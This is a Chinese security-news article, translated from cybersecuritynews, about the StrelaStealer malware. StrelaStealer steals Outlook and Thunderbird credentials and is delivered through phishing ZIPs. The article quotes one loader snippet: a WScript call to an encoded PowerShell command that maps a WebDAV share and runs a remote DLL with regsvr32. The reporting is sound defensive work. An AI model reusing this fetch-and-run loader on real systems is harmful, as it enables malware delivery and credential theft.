---
title: 攻击升级！StrelaStealer 绕过安全防线，窃取邮件敏感信息
url: https://www.anquanke.com/post/id/306732
source: 安全客-有思想的安全新媒体
date: 2025-04-22
fetch_date: 2025-10-06T22:03:45.301317
---

# 攻击升级！StrelaStealer 绕过安全防线，窃取邮件敏感信息

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 攻击升级！StrelaStealer 绕过安全防线，窃取邮件敏感信息

阅读量**53640**

发布时间 : 2025-04-21 14:39:04

**x**

##### 译文声明

本文是翻译文章，文章原作者 Tushar Subhra Dutta，文章来源：cybersecuritynews

原文地址：<https://cybersecuritynews.com/researchers-uncovered-the-stealthy-strelastealer-malware/>

译文仅供参考，具体内容表达以及含义原文为准。

研究人员发现恶意软件 StrelaStealer 专门针对 Microsoft Outlook 和 Mozilla Thunderbird 等热门电子邮件客户端的电子邮件凭据，给全球范围内的各类组织带来了严重的安全隐患。

该恶意软件通过窃取敏感的登录信息来运作，这有可能让攻击者获取到关键的通信内容和数据。

StrelaStealer 主要通过大规模的网络钓鱼活动进行传播。这些活动会发送包含恶意 JavaScript 文件的 ZIP 压缩文件。这些初始的感染载体是复杂攻击链的第一阶段。在这个阶段，相关脚本会从 WebDAV 服务器获取恶意的动态链接库（DLL）有效载荷，并直接在内存中执行，从而避开了许多传统的检测方法。

这种复杂精妙的传播机制使得攻击者能够绕开标准的安全控制措施，同时还能保证攻击行动的有效性。

这些恶意软件攻击活动已经影响了欧美地区 100 多个组织，尤其集中在意大利、西班牙、德国和乌克兰。

这些攻击的广泛传播表明，这是一场精心策划的行动，有着特定的攻击目标参数，而非随机散布的。

AttackIQ 的研究人员发现，StrelaStealer 与被称为 HIVE-0145 的威胁行为者组织有关，该组织自 2022 年末起就十分活跃。

安全分析师认为，这个组织是出于经济利益驱动的初始访问中间人，很可能是 StrelaStealer 恶意软件部署背后的唯一操控者。

对该威胁行为者的识别，为理解这种恶意软件的攻击目标和运作模式提供了宝贵的背景信息。

2024 年 11 月的最新分析显示，其传播和混淆技术得到了更新，这表明这种恶意软件在持续演变。

这些技术上的提升说明该威胁正处于积极的开发和维护状态，也意味着攻击活动仍在继续。

****深入剖析感染机制****

StrelaStealer 的感染过程始于受害者执行 ZIP 压缩文件中的 JavaScript 文件，通常是通过 Windows 脚本宿主（CScript 或 WScript）来执行。

初始脚本采用了多阶段的混淆技术，近期观察到的变种使用了以下技术：

var encoded = “powershell.exe -enc UEdVdEFBQiB1c2UgXFxcXDEwLjEwLjEwLjEwXFxzaGFyZSAvcGVyc2lzdDpubzsgcmVnc3ZyMzIgXFxcXDEwLjEwLjEwLjE

wXFxzaGFyZVxwYXlsb2FkLmRsbA==”

WScript.CreateObject(“WScript.Shell”).Run(encoded,0,true);

这段代码会启动一个 PowerShell 进程，该进程会执行一条经过编码的命令，以映射一个 WebDAV 网络路径，随后使用 Regsvr32 远程注册并执行托管在该共享路径上的 DLL 有效载荷。

随后，该恶意软件会进行广泛的系统侦察，在通过未加密的 HTTP 连接窃取所收集到的数据之前，它会收集有关主机系统、已安装的应用程序、国家区域设置以及网络连接状态等信息。

这种复杂精妙的攻击方式展示了威胁行为者在力求隐蔽自身以及确保操作安全的同时，还能在目标组织中高效获取凭据的能力。

本文翻译自cybersecuritynews [原文链接](https://cybersecuritynews.com/researchers-uncovered-the-stealthy-strelastealer-malware/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/306732](/post/id/306732)

安全KER - 有思想的安全新媒体

本文转载自: [cybersecuritynews](https://cybersecuritynews.com/researchers-uncovered-the-stealthy-strelastealer-malware/)

如若转载,请注明出处： <https://cybersecuritynews.com/researchers-uncovered-the-stealthy-strelastealer-malware/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**7赞

收藏

![](https://p3.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p0.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p3.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=175868)

[安全客](/member.html?memberId=175868)

这个人太懒了，签名都懒得写一个

* 文章
* **376**

* 粉丝
* **1**

### TA的文章

* ##### [mavinject.exe 遭利用，黑客绕过安全防线入侵系统](/post/id/306961)

  2025-04-28 10:48:18
* ##### [Docker 惊现新型加密挖矿攻击，借 Teneo 平台开辟恶意获利新路径](/post/id/306959)

  2025-04-28 10:39:59
* ##### [Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧](/post/id/306957)

  2025-04-28 10:34:35
* ##### [xrpl.js 库遭供应链攻击，超 290 万次下载用户私钥成窃取目标](/post/id/306953)

  2025-04-28 10:29:02
* ##### [恶意后门借 ViPNet 更新渗透，俄罗斯多行业数据安全拉响警报](/post/id/306951)

  2025-04-28 10:22:13

### 相关文章

* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28
* ##### [DarkCloud信息窃取器现新变种：采用VB6混淆技术并新增加密货币钱包窃取功能，威胁显著升级](/post/id/312435)

  2025-09-29 18:02:53
* ##### [TamperedChef恶意软件兴起：欺诈应用利用经过签名的二进制文件与搜索引擎投毒劫持浏览器](/post/id/312432)

  2025-09-29 18:02:25
* ##### [黑客将SVG文件武器化，用于隐秘投递恶意负载](/post/id/312351)

  2025-09-24 16:44:10
* ##### [ShadowV2僵尸网络利用配置错误的AWS Docker容器构建DDoS攻击租用服务](/post/id/312381)

  2025-09-24 16:40:43
* ##### [npm软件包“fezbox”中被发现新型恶意软件，可利用二维码窃取用户凭据](/post/id/312387)

  2025-09-24 16:40:06

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)